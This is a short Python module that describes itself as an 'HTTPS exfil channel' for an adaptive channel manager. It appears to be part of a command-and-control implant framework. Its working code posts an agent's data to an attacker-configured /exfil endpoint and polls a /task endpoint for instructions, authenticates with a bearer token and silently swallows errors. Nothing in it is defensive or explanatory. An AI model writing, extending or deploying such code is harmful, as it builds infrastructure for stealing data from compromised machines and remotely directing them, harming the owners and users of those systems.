"""
HTTPS exfil channel.
Implements the send/get interface expected by adaptive_channel_manager.
"""
from __future__ import annotations

import os

import requests

_ENDPOINT = os.environ.get("ZDS_HTTPS_ENDPOINT", "")
_TOKEN = os.environ.get("ZDS_AUTH_TOKEN", "")

_HEADERS = {"Authorization": f"Bearer {_TOKEN}"} if _TOKEN else {}


def send_via_https(agent_id: str, data_blob: dict) -> bool:
    if not _ENDPOINT:
        return False
    try:
        r = requests.post(
            f"{_ENDPOINT}/exfil",
            json={"agent_id": agent_id, "data": data_blob},
            headers=_HEADERS,
            timeout=10,
            verify=True,
        )
        return r.status_code == 200
    except Exception:
        return False


def get_task_https(agent_id: str) -> dict | None:
    if not _ENDPOINT:
        return None
    try:
        r = requests.get(
            f"{_ENDPOINT}/task",
            params={"agent_id": agent_id},
            headers=_HEADERS,
            timeout=10,
            verify=True,
        )
        if r.status_code == 200:
            data = r.json()
            return data if data.get("task") else None
    except Exception:
        return None
    return None
